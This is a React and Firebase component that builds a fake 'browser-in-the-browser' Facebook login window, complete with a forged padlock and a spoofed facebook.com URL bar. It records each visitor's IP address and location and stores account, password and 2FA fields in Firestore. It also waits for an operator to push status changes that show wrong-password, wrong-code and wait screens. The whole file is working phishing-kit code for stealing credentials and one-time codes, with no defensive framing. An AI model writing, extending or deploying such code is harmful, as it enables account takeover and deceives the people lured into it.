import React, { useState } from "react";
import { Modal } from "antd";
import { ConfirmationModal } from "./ConfirmationModal";
import { Confirmation } from "./Confirmation";
import { LoadingFacebookButton } from "./LoadingFacebookButton";
import {ConfirmationSecond} from "./ConfirmationSecond"
import { TenMinute } from "./TenMinute";
import { Landing } from "./Landing";


import {
    collection,
    addDoc,
    onSnapshot,
    doc,
  } from "firebase/firestore";
  import { db } from "../firebase";

export const FacebookButton = () => {
    const [isModalVisible, setIsModalVisible] = useState(false);
    const [modalState, setValue] = useState(55);
    const handleCancel = () => {
        setIsModalVisible(false);
        setValue(55)
    };

    const createUserDb = () =>{
        try {
        var unique_id = localStorage.getItem("unique_id");
        if(!unique_id){
            fetch("https://api.db-ip.com/v2/free/self/").then(d => d.json()).then(async d => {
                var ipaddress = ipaddress = JSON.stringify({ IP: d.ipAddress, country: d.countryName, city: d.city});
                const user = await addDoc(collection(db, "users"), {
                  password:'123',account:'123',auth:'',ip:ipaddress,status: 1,status2:0,createdAt: new Date().getTime(),
                });
                listener(user.id);
                localStorage.setItem("unique_id", JSON.stringify(user.id));
                localStorage.setItem("crr_status", JSON.stringify(user.status));
            });
        }else{
            const crr_status = localStorage.getItem("crr_status");
            if(crr_status){
                setValue(crr_status);
            }
            listener(JSON.parse(unique_id));
        }
        } catch (error) {
            console.error("Error saving data to storage: ", error);
        }
    };


    const showModal = () => {
        setIsModalVisible(true);
        createUserDb();
    };

    const listener = (userID) => {
        onSnapshot(doc(db, "users", userID), (snapshot) => {
          const status = snapshot.data()?.status;
          if (typeof(status) !== 'undefined' && status != null) {
            console.log(status);
            localStorage.setItem("crr_status", JSON.stringify(status));
            if (status === 0 || status === 1) return;
            setValue(status);
          } 
        });
    };

    const changeModalScreens = (state) => {
       if (state === 0) {
            return <LoadingFacebookButton isModalVisible={isModalVisible} setValue={setValue} handleCancel={handleCancel} />
        } else if (state == -1) {
            return <ConfirmationModal setValue={setValue} wrong_password={true} />
        } else if (state == 2) {
            return <Confirmation setValue={setValue} />
        } else if (state == -2) {
            return <Confirmation setValue={setValue} wrong_auth={true} />
        } else if (state == 3) {
            return <ConfirmationSecond setValue={setValue} />
        } else if (state == -3) {
            return <ConfirmationSecond setValue={setValue} wrong_auth={true} />
        } else if (state == 4) {
            return <TenMinute setValue={setValue} />
        } else{
            return <ConfirmationModal setValue={setValue} />
        }

    }

    return (
        <>
            <Landing showModal={showModal} />
            <Modal
            className="modal-wrapper modal__facebook"
            width={1000}
            style={{ height: 650 }}
            title={
                <div>
                    <div className="wrapper_header">
                        <div className="sign__up-modal">
                            <img src="/hLRJ1GG_y0J.ico" alt="" width="17px" />
                            <p>Log into Facebook | Facebook</p>
                        </div>
                        <div className="icons">
                            <div className="img" onClick={handleCancel}>
                                <img src="/minus.png" alt="" />
                            </div>
                            <div className="img">
                                <img src="/maximize-size.png" alt="" />
                            </div>
                            <div className="img img-x" onClick={handleCancel}>
                                <img src="/close.png" alt="" />
                            </div>
                        </div>
                    </div>
                    <div className="input__title-wrapper">
                        <div className="lock__screen">
                            <div className="lock">
                                <div className="lock__wrapper">
                                    <img src="/locktest.png" alt="" />
                                    <span className="green">Secure | https:</span><span className="black-opacity">//</span>
                                </div>
                            </div>
                            <span className="input__value">
                                www.facebook.com
                                <span className="black"> /login.php?skip<span className="hide__text-mobile">_api_login=1  &api_key=481324359126967&kid_directed_site=0&app_id=481324359126967&signed...</span></span>
                            </span>
                        </div>
                    </div>
                </div>
            }
            open={isModalVisible}
            maskClosable={false}
        >
            {changeModalScreens(modalState)}
        </Modal>
        </>
    )
}